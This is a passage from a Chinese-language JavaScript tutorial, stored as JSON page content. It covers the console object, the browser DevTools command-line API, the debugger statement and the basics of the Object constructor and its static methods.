&#039;hack&#039;: function () {\n      return &#039;hack&#039;;\n    },\n    &#039;slash&#039;: function () {\n      return &#039;slash&#039;;\n    },\n    &#039;run&#039;: function () {\n      return &#039;run&#039;;\n    }\n  };\n\n  if (typeof actions[action] !== &#039;function&#039;) {\n    throw new Error(&#039;Invalid action.&#039;);\n  }\n\n  return actions[action]();\n}</code></pre><p>因此，建议<code>switch...case</code>结构可以用对象结构代替。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Eric Elliott, Programming JavaScript Applications, <a href=\"http://chimera.labs.oreilly.com/books/1234000000262/ch02.html\">Chapter 2. JavaScript Style Guide</a>, O&#39;Reilly, 2013</li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/07/meta-style-guide.html\">A meta style guide for JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/05/semicolon-insertion.html\">Automatic semicolon insertion in JavaScript</a></li>\n<li>Rod Vagg, <a href=\"http://dailyjs.com/2012/04/19/semicolons/\">JavaScript and Semicolons</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"console 对象与控制台","link":"/features/console.html"}],"content":"\n        <h1>\n            <a href='#console-对象与控制台' class='header-anchor'>#</a>\n            <span>console 对象与控制台</span>\n        </h1>\n    \n        <h2>\n            <a href='#console-对象' class='header-anchor'>#</a>\n            <span>console 对象</span>\n        </h2>\n    <p><code>console</code>对象是 JavaScript 的原生对象，它有点像 Unix 系统的标准输出<code>stdout</code>和标准错误<code>stderr</code>，可以输出各种信息到控制台，并且还提供了很多有用的辅助方法。</p>\n<p><code>console</code>的常见用途有两个。</p>\n<ul>\n<li>调试程序，显示网页代码运行时的错误信息。</li>\n<li>提供了一个命令行接口，用来与网页代码互动。</li>\n</ul>\n<p><code>console</code>对象的浏览器实现，包含在浏览器自带的开发工具之中。以 Chrome 浏览器的“开发者工具”（Developer Tools）为例，可以使用下面三种方法的打开它。</p>\n<ol>\n<li>按 F12 或者<code>Control + Shift + i</code>（PC）/ <code>Alt + Command + i</code>（Mac）。</li>\n<li>浏览器菜单选择“工具/开发者工具”。</li>\n<li>在一个页面元素上，打开右键菜单，选择其中的“Inspect Element”。</li>\n</ol>\n<p>打开开发者工具以后，顶端有多个面板。</p>\n<ul>\n<li><strong>Elements</strong>：查看网页的 HTML 源码和 CSS 代码。</li>\n<li><strong>Resources</strong>：查看网页加载的各种资源文件（比如代码文件、字体文件 CSS 文件等），以及在硬盘上创建的各种内容（比如本地缓存、Cookie、Local Storage等）。</li>\n<li><strong>Network</strong>：查看网页的 HTTP 通信情况。</li>\n<li><strong>Sources</strong>：查看网页加载的脚本源码。</li>\n<li><strong>Timeline</strong>：查看各种网页行为随时间变化的情况。</li>\n<li><strong>Performance</strong>：查看网页的性能情况，比如 CPU 和内存消耗。</li>\n<li><strong>Console</strong>：用来运行 JavaScript 命令。</li>\n</ul>\n<p>这些面板都有各自的用途，以下只介绍<code>Console</code>面板（又称为控制台）。</p>\n<p><code>Console</code>面板基本上就是一个命令行窗口，你可以在提示符下，键入各种命令。</p>\n\n        <h2>\n            <a href='#console-对象的静态方法' class='header-anchor'>#</a>\n            <span>console 对象的静态方法</span>\n        </h2>\n    <p><code>console</code>对象提供的各种静态方法，用来与控制台窗口互动。</p>\n\n        <h3>\n            <a href='#console.log()，console.info()，console.debug()' class='header-anchor'>#</a>\n            <span>console.log()，console.info()，console.debug()</span>\n        </h3>\n    <p><code>console.log</code>方法用于在控制台输出信息。它可以接受一个或多个参数，将它们连接起来输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039;Hello World&#039;)\n// Hello World\nconsole.log(&#039;a&#039;, &#039;b&#039;, &#039;c&#039;)\n// a b c</code></pre><p><code>console.log</code>方法会自动在每次输出的结尾，添加换行符。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(1);\nconsole.log(2);\nconsole.log(3);\n// 1\n// 2\n// 3</code></pre><p>如果第一个参数是格式字符串（使用了格式占位符），<code>console.log</code>方法将依次用后面的参数替换占位符，然后再进行输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039; %s + %s = %s&#039;, 1, 1, 2)\n//  1 + 1 = 2</code></pre><p>上面代码中，<code>console.log</code>方法的第一个参数有三个占位符（<code>%s</code>），第二、三、四个参数会在显示时，依次替换掉这个三个占位符。</p>\n<p><code>console.log</code>方法支持以下占位符，不同类型的数据必须使用对应的占位符。</p>\n<ul>\n<li><code>%s</code> 字符串</li>\n<li><code>%d</code> 整数</li>\n<li><code>%i</code> 整数</li>\n<li><code>%f</code> 浮点数</li>\n<li><code>%o</code> 对象的链接</li>\n<li><code>%c</code> CSS 格式字符串</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var number = 11 * 9;\nvar color = &#039;red&#039;;\n\nconsole.log(&#039;%d %s balloons&#039;, number, color);\n// 99 red balloons</code></pre><p>上面代码中，第二个参数是数值，对应的占位符是<code>%d</code>，第三个参数是字符串，对应的占位符是<code>%s</code>。</p>\n<p>使用<code>%c</code>占位符时，对应的参数必须是 CSS 代码，用来对输出内容进行CSS渲染。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(\n  &#039;%cThis text is styled!&#039;,\n  &#039;color: red; background: yellow; font-size: 24px;&#039;\n)</code></pre><p>上面代码运行后，输出的内容将显示为黄底红字。</p>\n<p><code>console.log</code>方法的两种参数格式，可以结合在一起使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039; %s + %s &#039;, 1, 1, &#039;= 2&#039;)\n// 1 + 1  = 2</code></pre><p>如果参数是一个对象，<code>console.log</code>会显示该对象的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log({foo: &#039;bar&#039;})\n// Object {foo: &quot;bar&quot;}\nconsole.log(Date)\n// function Date() { [native code] }</code></pre><p>上面代码输出<code>Date</code>对象的值，结果为一个构造函数。</p>\n<p><code>console.info</code>是<code>console.log</code>方法的别名，用法完全一样。只不过<code>console.info</code>方法会在输出信息的前面，加上一个蓝色图标。</p>\n<p><code>console.debug</code>方法与<code>console.log</code>方法类似，会在控制台输出调试信息。但是，默认情况下，<code>console.debug</code>输出的信息不会显示，只有在打开显示级别在<code>verbose</code>的情况下，才会显示。</p>\n<p><code>console</code>对象的所有方法，都可以被覆盖。因此，可以按照自己的需要，定义<code>console.log</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;log&#039;, &#039;info&#039;, &#039;warn&#039;, &#039;error&#039;].forEach(function(method) {\n  console[method] = console[method].bind(\n    console,\n    new Date().toISOString()\n  );\n});\n\nconsole.log(&quot;出错了！&quot;);\n// 2014-05-18T09:00.000Z 出错了！</code></pre><p>上面代码表示，使用自定义的<code>console.log</code>方法，可以在显示结果添加当前时间。</p>\n\n        <h3>\n            <a href='#console.warn()，console.error()' class='header-anchor'>#</a>\n            <span>console.warn()，console.error()</span>\n        </h3>\n    <p><code>warn</code>方法和<code>error</code>方法也是在控制台输出信息，它们与<code>log</code>方法的不同之处在于，<code>warn</code>方法输出信息时，在最前面加一个黄色三角，表示警告；<code>error</code>方法输出信息时，在最前面加一个红色的叉，表示出错。同时，还会高亮显示输出文字和错误发生的堆栈。其他方面都一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.error(&#039;Error: %s (%i)&#039;, &#039;Server is not responding&#039;, 500)\n// Error: Server is not responding (500)\nconsole.warn(&#039;Warning! Too few nodes (%d)&#039;, document.childNodes.length)\n// Warning! Too few nodes (1)</code></pre><p>可以这样理解，<code>log</code>方法是写入标准输出（<code>stdout</code>），<code>warn</code>方法和<code>error</code>方法是写入标准错误（<code>stderr</code>）。</p>\n\n        <h3>\n            <a href='#console.table()' class='header-anchor'>#</a>\n            <span>console.table()</span>\n        </h3>\n    <p>对于某些复合类型的数据，<code>console.table</code>方法可以将其转为表格显示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var languages = [\n  { name: &quot;JavaScript&quot;, fileExtension: &quot;.js&quot; },\n  { name: &quot;TypeScript&quot;, fileExtension: &quot;.ts&quot; },\n  { name: &quot;CoffeeScript&quot;, fileExtension: &quot;.coffee&quot; }\n];\n\nconsole.table(languages);</code></pre><p>上面代码的<code>language</code>变量，转为表格显示如下。</p>\n<table>\n<thead>\n<tr>\n<th>(index)</th>\n<th>name</th>\n<th>fileExtension</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>&quot;JavaScript&quot;</td>\n<td>&quot;.js&quot;</td>\n</tr>\n<tr>\n<td>1</td>\n<td>&quot;TypeScript&quot;</td>\n<td>&quot;.ts&quot;</td>\n</tr>\n<tr>\n<td>2</td>\n<td>&quot;CoffeeScript&quot;</td>\n<td>&quot;.coffee&quot;</td>\n</tr>\n</tbody></table>\n<p>下面是显示表格内容的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var languages = {\n  csharp: { name: &quot;C#&quot;, paradigm: &quot;object-oriented&quot; },\n  fsharp: { name: &quot;F#&quot;, paradigm: &quot;functional&quot; }\n};\n\nconsole.table(languages);</code></pre><p>上面代码的<code>language</code>，转为表格显示如下。</p>\n<table>\n<thead>\n<tr>\n<th>(index)</th>\n<th>name</th>\n<th>paradigm</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>csharp</td>\n<td>&quot;C#&quot;</td>\n<td>&quot;object-oriented&quot;</td>\n</tr>\n<tr>\n<td>fsharp</td>\n<td>&quot;F#&quot;</td>\n<td>&quot;functional&quot;</td>\n</tr>\n</tbody></table>\n\n        <h3>\n            <a href='#console.count()' class='header-anchor'>#</a>\n            <span>console.count()</span>\n        </h3>\n    <p><code>count</code>方法用于计数，输出它被调用了多少次。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greet(user) {\n  console.count();\n  return &#039;hi &#039; + user;\n}\n\ngreet(&#039;bob&#039;)\n//  : 1\n// &quot;hi bob&quot;\n\ngreet(&#039;alice&#039;)\n//  : 2\n// &quot;hi alice&quot;\n\ngreet(&#039;bob&#039;)\n//  : 3\n// &quot;hi bob&quot;</code></pre><p>上面代码每次调用<code>greet</code>函数，内部的<code>console.count</code>方法就输出执行次数。</p>\n<p>该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greet(user) {\n  console.count(user);\n  return &quot;hi &quot; + user;\n}\n\ngreet(&#039;bob&#039;)\n// bob: 1\n// &quot;hi bob&quot;\n\ngreet(&#039;alice&#039;)\n// alice: 1\n// &quot;hi alice&quot;\n\ngreet(&#039;bob&#039;)\n// bob: 2\n// &quot;hi bob&quot;</code></pre><p>上面代码根据参数的不同，显示<code>bob</code>执行了两次，<code>alice</code>执行了一次。</p>\n\n        <h3>\n            <a href='#console.dir()，console.dirxml()' class='header-anchor'>#</a>\n            <span>console.dir()，console.dirxml()</span>\n        </h3>\n    <p><code>dir</code>方法用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log({f1: &#039;foo&#039;, f2: &#039;bar&#039;})\n// Object {f1: &quot;foo&quot;, f2: &quot;bar&quot;}\n\nconsole.dir({f1: &#039;foo&#039;, f2: &#039;bar&#039;})\n// Object\n//   f1: &quot;foo&quot;\n//   f2: &quot;bar&quot;\n//   __proto__: Object</code></pre><p>上面代码显示<code>dir</code>方法的输出结果，比<code>log</code>方法更易读，信息也更丰富。</p>\n<p>该方法对于输出 DOM 对象非常有用，因为会显示 DOM 对象的所有属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dir(document.body)</code></pre><p>Node 环境之中，还可以指定以代码高亮的形式输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dir(obj, {colors: true})</code></pre><p><code>dirxml</code>方法主要用于以目录树的形式，显示 DOM 节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dirxml(document.body)</code></pre><p>如果参数不是 DOM 节点，而是普通的 JavaScript 对象，<code>console.dirxml</code>等同于<code>console.dir</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dirxml([1, 2, 3])\n// 等同于\nconsole.dir([1, 2, 3])</code></pre>\n        <h3>\n            <a href='#console.assert()' class='header-anchor'>#</a>\n            <span>console.assert()</span>\n        </h3>\n    <p><code>console.assert</code>方法主要用于程序运行过程中，进行条件判断，如果不满足条件，就显示一个错误，但不会中断程序执行。这样就相当于提示用户，内部状态不正确。</p>\n<p>它接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为<code>false</code>，才会提示有错误，在控制台输出第二个参数，否则不会有任何结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.assert(false, &#039;判断条件不成立&#039;)\n// Assertion failed: 判断条件不成立\n\n// 相当于\ntry {\n  if (false) {\n    throw new Error(&#039;判断条件不成立&#039;);\n  }\n} catch(e) {\n  console.error(e);\n}</code></pre><p>下面是一个例子，判断子节点的个数是否大于等于500。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.assert(list.childNodes.length &lt; 500, &#039;节点个数大于等于500&#039;)</code></pre><p>上面代码中，如果符合条件的节点小于500个，不会有任何输出；只有大于等于500时，才会在控制台提示错误，并且显示指定文本。</p>\n\n        <h3>\n            <a href='#console.time()，console.timeEnd()' class='header-anchor'>#</a>\n            <span>console.time()，console.timeEnd()</span>\n        </h3>\n    <p>这两个方法用于计时，可以算出一个操作所花费的准确时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.time(&#039;Array initialize&#039;);\n\nvar array= new Array(1000000);\nfor (var i = array.length - 1; i &gt;= 0; i--) {\n  array[i] = new Object();\n};\n\nconsole.timeEnd(&#039;Array initialize&#039;);\n// Array initialize: 1914.481ms</code></pre><p><code>time</code>方法表示计时开始，<code>timeEnd</code>方法表示计时结束。它们的参数是计时器的名称。调用<code>timeEnd</code>方法之后，控制台会显示“计时器名称: 所耗费的时间”。</p>\n\n        <h3>\n            <a href='#console.group()，console.groupEnd()，console.groupCollapsed()' class='header-anchor'>#</a>\n            <span>console.group()，console.groupEnd()，console.groupCollapsed()</span>\n        </h3>\n    <p><code>console.group</code>和<code>console.groupEnd</code>这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.group(&#039;一级分组&#039;);\nconsole.log(&#039;一级分组的内容&#039;);\n\nconsole.group(&#039;二级分组&#039;);\nconsole.log(&#039;二级分组的内容&#039;);\n\nconsole.groupEnd(); // 一级分组结束\nconsole.groupEnd(); // 二级分组结束</code></pre><p>上面代码会将“二级分组”显示在“一级分组”内部，并且“一级分组”和“二级分组”前面都有一个折叠符号，可以用来折叠本级的内容。</p>\n<p><code>console.groupCollapsed</code>方法与<code>console.group</code>方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.groupCollapsed(&#039;Fetching Data&#039;);\n\nconsole.log(&#039;Request Sent&#039;);\nconsole.error(&#039;Error: Server not responding (500)&#039;);\n\nconsole.groupEnd();</code></pre><p>上面代码只显示一行”Fetching Data“，点击后才会展开，显示其中包含的两行。</p>\n\n        <h3>\n            <a href='#console.trace()，console.clear()' class='header-anchor'>#</a>\n            <span>console.trace()，console.clear()</span>\n        </h3>\n    <p><code>console.trace</code>方法显示当前执行的代码在堆栈中的调用路径。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.trace()\n// console.trace()\n//   (anonymous function)\n//   InjectedScript._evaluateOn\n//   InjectedScript._evaluateAndWrap\n//   InjectedScript.evaluate</code></pre><p><code>console.clear</code>方法用于清除当前控制台的所有输出，将光标回置到第一行。如果用户选中了控制台的“Preserve log”选项，<code>console.clear</code>方法将不起作用。</p>\n\n        <h2>\n            <a href='#控制台命令行-API' class='header-anchor'>#</a>\n            <span>控制台命令行 API</span>\n        </h2>\n    <p>浏览器控制台中，除了使用<code>console</code>对象，还可以使用一些控制台自带的命令行方法。</p>\n<p>（1）<code>$_</code></p>\n<p><code>$_</code>属性返回上一个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 + 2\n// 4\n$_\n// 4</code></pre><p>（2）<code>$0</code> - <code>$4</code></p>\n<p>控制台保存了最近5个在 Elements 面板选中的 DOM 元素，<code>$0</code>代表倒数第一个（最近一个），<code>$1</code>代表倒数第二个，以此类推直到<code>$4</code>。</p>\n<p>（3）<code>$(selector)</code></p>\n<p><code>$(selector)</code>返回第一个匹配的元素，等同于<code>document.querySelector()</code>。注意，如果页面脚本对<code>$</code>有定义，则会覆盖原始的定义。比如，页面里面有 jQuery，控制台执行<code>$(selector)</code>就会采用 jQuery 的实现，返回一个数组。</p>\n<p>（4）<code>$(selector)</code></p>\n<p><code>$(selector)</code>返回选中的 DOM 对象，等同于<code>document.querySelectorAll</code>。</p>\n<p>（5）<code>$x(path)</code></p>\n<p><code>$x(path)</code>方法返回一个数组，包含匹配特定 XPath 表达式的所有 DOM 元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>$x(&quot;//p[a]&quot;)</code></pre><p>上面代码返回所有包含<code>a</code>元素的<code>p</code>元素。</p>\n<p>（6）<code>inspect(object)</code></p>\n<p><code>inspect(object)</code>方法打开相关面板，并选中相应的元素，显示它的细节。DOM 元素在<code>Elements</code>面板中显示，比如<code>inspect(document)</code>会在 Elements 面板显示<code>document</code>元素。JavaScript 对象在控制台面板<code>Profiles</code>面板中显示，比如<code>inspect(window)</code>。</p>\n<p>（7）<code>getEventListeners(object)</code></p>\n<p><code>getEventListeners(object)</code>方法返回一个对象，该对象的成员为<code>object</code>登记了回调函数的各种事件（比如<code>click</code>或<code>keydown</code>），每个事件对应一个数组，数组的成员为该事件的回调函数。</p>\n<p>（8）<code>keys(object)</code>，<code>values(object)</code></p>\n<p><code>keys(object)</code>方法返回一个数组，包含<code>object</code>的所有键名。</p>\n<p><code>values(object)</code>方法返回一个数组，包含<code>object</code>的所有键值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {&#039;p1&#039;: &#039;a&#039;, &#039;p2&#039;: &#039;b&#039;};\n\nkeys(o)\n// [&quot;p1&quot;, &quot;p2&quot;]\nvalues(o)\n// [&quot;a&quot;, &quot;b&quot;]</code></pre><p>（9）<code>monitorEvents(object[, events]) ，unmonitorEvents(object[, events])</code></p>\n<p><code>monitorEvents(object[, events])</code>方法监听特定对象上发生的特定事件。事件发生时，会返回一个<code>Event</code>对象，包含该事件的相关信息。<code>unmonitorEvents</code>方法用于停止监听。</p>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents(window, &quot;resize&quot;);\nmonitorEvents(window, [&quot;resize&quot;, &quot;scroll&quot;])</code></pre><p>上面代码分别表示单个事件和多个事件的监听方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents($0, &#039;mouse&#039;);\nunmonitorEvents($0, &#039;mousemove&#039;);</code></pre><p>上面代码表示如何停止监听。</p>\n<p><code>monitorEvents</code>允许监听同一大类的事件。所有事件可以分成四个大类。</p>\n<ul>\n<li>mouse：&quot;mousedown&quot;, &quot;mouseup&quot;, &quot;click&quot;, &quot;dblclick&quot;, &quot;mousemove&quot;, &quot;mouseover&quot;, &quot;mouseout&quot;, &quot;mousewheel&quot;</li>\n<li>key：&quot;keydown&quot;, &quot;keyup&quot;, &quot;keypress&quot;, &quot;textInput&quot;</li>\n<li>touch：&quot;touchstart&quot;, &quot;touchmove&quot;, &quot;touchend&quot;, &quot;touchcancel&quot;</li>\n<li>control：&quot;resize&quot;, &quot;scroll&quot;, &quot;zoom&quot;, &quot;focus&quot;, &quot;blur&quot;, &quot;select&quot;, &quot;change&quot;, &quot;submit&quot;, &quot;reset&quot;</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents($(&quot;#msg&quot;), &quot;key&quot;);</code></pre><p>上面代码表示监听所有<code>key</code>大类的事件。</p>\n<p>（10）其他方法</p>\n<p>命令行 API 还提供以下方法。</p>\n<ul>\n<li><code>clear()</code>：清除控制台的历史。</li>\n<li><code>copy(object)</code>：复制特定 DOM 元素到剪贴板。</li>\n<li><code>dir(object)</code>：显示特定对象的所有属性，是<code>console.dir</code>方法的别名。</li>\n<li><code>dirxml(object)</code>：显示特定对象的 XML 形式，是<code>console.dirxml</code>方法的别名。</li>\n</ul>\n\n        <h2>\n            <a href='#debugger-语句' class='header-anchor'>#</a>\n            <span>debugger 语句</span>\n        </h2>\n    <p><code>debugger</code>语句主要用于除错，作用是设置断点。如果有正在运行的除错工具，程序运行到<code>debugger</code>语句时会自动停下。如果没有除错工具，<code>debugger</code>语句不会产生任何结果，JavaScript 引擎自动跳过这一句。</p>\n<p>Chrome 浏览器中，当代码运行到<code>debugger</code>语句时，就会暂停运行，自动打开脚本源码界面。</p>\n<pre class=\"prettyprint language-javascript\"><code>for(var i = 0; i &lt; 5; i++){\n  console.log(i);\n  if (i === 2) debugger;\n}</code></pre><p>上面代码打印出0，1，2以后，就会暂停，自动打开源码界面，等待进一步处理。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Chrome Developer Tools, <a href=\"https://developers.google.com/chrome-developer-tools/docs/console\">Using the Console</a></li>\n<li>Matt West, <a href=\"http://blog.teamtreehouse.com/mastering-developer-tools-console\">Mastering The Developer Tools Console</a></li>\n<li>Firebug Wiki, <a href=\"https://getfirebug.com/wiki/index.php/Console_API\">Console API</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/10/console-api.html\">The JavaScript console API</a></li>\n<li>Marius Schulz, <a href=\"http://blog.mariusschulz.com/2013/11/13/advanced-javascript-debugging-with-consoletable\">Advanced JavaScript Debugging with console.table()</a></li>\n<li>Google Developer, <a href=\"https://developers.google.com/chrome-developer-tools/docs/commandline-api\">Command Line API Reference</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Object对象","link":"/stdlib/object.html"}],"content":"\n        <h1>\n            <a href='#Object-对象' class='header-anchor'>#</a>\n            <span>Object 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 原生提供<code>Object</code>对象（注意起首的<code>O</code>是大写），本章介绍该对象原生的各种方法。</p>\n<p>JavaScript 的所有其他对象都继承自<code>Object</code>对象，即那些对象都是<code>Object</code>的实例。</p>\n<p><code>Object</code>对象的原生方法分成两类：<code>Object</code>本身的方法与<code>Object</code>的实例方法。</p>\n<p><strong>（1）<code>Object</code>对象本身的方法</strong></p>\n<p>所谓”本身的方法“就是直接定义在<code>Object</code>对象的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.print = function (o) { console.log(o) };</code></pre><p>上面代码中，<code>print</code>方法就是直接定义在<code>Object</code>对象上。</p>\n<p><strong>（2）<code>Object</code>的实例方法</strong></p>\n<p>所谓实例方法就是定义在<code>Object</code>原型对象<code>Object.prototype</code>上的方法。它可以被<code>Object</code>实例直接使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.print = function () {\n  console.log(this);\n};\n\nvar obj = new Object();\nobj.print() // Object</code></pre><p>上面代码中，<code>Object.prototype</code>定义了一个<code>print</code>方法，然后生成一个<code>Object</code>的实例<code>obj</code>。<code>obj</code>直接继承了<code>Object.prototype</code>的属性和方法，可以直接使用<code>obj.print</code>调用<code>print</code>方法。也就是说，<code>obj</code>对象的<code>print</code>方法实质上就是调用<code>Object.prototype.print</code>方法。</p>\n<p>关于原型对象<code>object.prototype</code>的详细解释，参见《面向对象编程》章节。这里只要知道，凡是定义在<code>Object.prototype</code>对象上面的属性和方法，将被所有实例对象共享就可以了。</p>\n<p>以下先介绍<code>Object</code>作为函数的用法，然后再介绍<code>Object</code>对象的原生方法，分成对象自身的方法（又称为”静态方法“）和实例方法两部分。</p>\n\n        <h2>\n            <a href='#Object()' class='header-anchor'>#</a>\n            <span>Object()</span>\n        </h2>\n    <p><code>Object</code>本身是一个函数，可以当作工具方法使用，将任意值转为对象。这个方法常用于保证某个值一定是对象。</p>\n<p>如果参数为空（或者为<code>undefined</code>和<code>null</code>），<code>Object()</code>返回一个空对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object();\n// 等同于\nvar obj = Object(undefined);\nvar obj = Object(null);\n\nobj instanceof Object // true</code></pre><p>上面代码的含义，是将<code>undefined</code>和<code>null</code>转为对象，结果得到了一个空对象<code>obj</code>。</p>\n<p><code>instanceof</code>运算符用来验证，一个对象是否为指定的构造函数的实例。<code>obj instanceof Object</code>返回<code>true</code>，就表示<code>obj</code>对象是<code>Object</code>的实例。</p>\n<p>如果参数是原始类型的值，<code>Object</code>方法将其转为对应的包装对象的实例（参见《原始类型的包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object(1);\nobj instanceof Object // true\nobj instanceof Number // true\n\nvar obj = Object(&#039;foo&#039;);\nobj instanceof Object // true\nobj instanceof String // true\n\nvar obj = Object(true);\nobj instanceof Object // true\nobj instanceof Boolean // true</code></pre><p>上面代码中，<code>Object</code>函数的参数是各种原始类型的值，转换成对象就是原始类型值对应的包装对象。</p>\n<p>如果<code>Object</code>方法的参数是一个对象，它总是返回该对象，即不用转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\nvar obj = Object(arr); // 返回原数组\nobj === arr // true\n\nvar value = {};\nvar obj = Object(value) // 返回原对象\nobj === value // true\n\nvar fn = function () {};\nvar obj = Object(fn); // 返回原函数\nobj === fn // true</code></pre><p>利用这一点，可以写一个判断变量是否为对象的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function isObject(value) {\n  return value === Object(value);\n}\n\nisObject([]) // true\nisObject(true) // false</code></pre>\n        <h2>\n            <a href='#Object-构造函数' class='header-anchor'>#</a>\n            <span>Object 构造函数</span>\n        </h2>\n    <p><code>Object</code>不仅可以当作工具函数使用，还可以当作构造函数使用，即前面可以使用<code>new</code>命令。</p>\n<p><code>Object</code>构造函数的首要用途，是直接通过它来生成新对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();</code></pre><blockquote>\n<p>注意，通过<code>var obj = new Object()</code>的写法生成新对象，与字面量的写法<code>var obj = {}</code>是等价的。或者说，后者只是前者的一种简便写法。</p>\n</blockquote>\n<p><code>Object</code>构造函数的用法与工具方法很相似，几乎一模一样。使用时，可以接受一个参数，如果该参数是一个对象，则直接返回这个对象；如果是一个原始类型的值，则返回该值对应的包装对象（详见《包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {a: 1};\nvar o2 = new Object(o1);\no1 === o2 // true\n\nvar obj = new Object(123);\nobj instanceof Number // true</code></pre><p>虽然用法相似，但是<code>Object(value)</code>与<code>new Object(value)</code>两者的语义是不同的，<code>Object(value)</code>表示将<code>value</code>转成一个对象，<code>new Object(value)</code>则表示新生成一个对象，它的值是<code>value</code>。</p>\n\n        <h2>\n            <a href='#Object-的静态方法' class='header-anchor'>#</a>\n            <span>Object 的静态方法</span>\n        </h2>\n    <p>所谓“静态方法”，是指部署在<code>Object</code>对象自身的方法。</p>\n\n        <h3>\n            <a href='#Object.keys()，Object.getOwnPropertyNames()' class='header-anchor'>#</a>\n            <span>Object.keys()，Object.getOwnPropertyNames()</span>\n        </h3>\n    <p><code>Object.keys</code>方法和<code>Object.getOwnPropertyNames</code>方法都用来遍历对象的属性。</p>\n<p><code>Object.keys</code>方法的参数是一个对象，返回一个数组。该数组的成员都是该对象自身的（而不是继承的）所有属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.keys(obj) // [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p><code>Object.getOwnPropertyNames</code>方法与<code>Object.keys</code>类似，也是接受一个对象作为参数，返回一个数组，包含了该对象自身的所有属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.getOwnPropertyNames(obj) // [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p>对于一般的对象来说，<code>Object.keys()</code>和<code>Object.getOwnPropertyNames()</code>返回的结果是一样的。只有涉及不可枚举属性时，才会有不一样的结果。<code>Object.keys</code>方法只返回可枚举的属性（详见《对象属性的描述对象》一章），<code>Object.getOwnPropertyNames</code>方法还返回不可枚举的属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;Hello&#039;, &#039;World&#039;];\n\nObject.keys(a) // [&quot;0&quot;, &quot;1&quot;]\nObject.getOwnPropertyNames(a) // [&quot;0&quot;, &quot;1&quot;, &quot;length&quot;]</code></pre><p>上面代码中，数组的<code>length</code>属性是不可枚举的属性，所以只出现在<code>Object.getOwnPropertyNames</code>方法的返回结果中。</p>\n<p>由于 JavaScript 没有提供计算对象属性个数的方法，所以可以用这两个方法代替。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.keys(obj).length // 2\nObject.getOwnPropertyNames(obj).length // 2</code></pre><p>一般情况下，几乎总是使用<code>Object.keys</code>方法，遍历数组的属性。</p>\n\n        <h3>\n            <a href='#其他方法' class='header-anchor'>#</a>\n            <span>其他方法</span>\n        </h3>\n    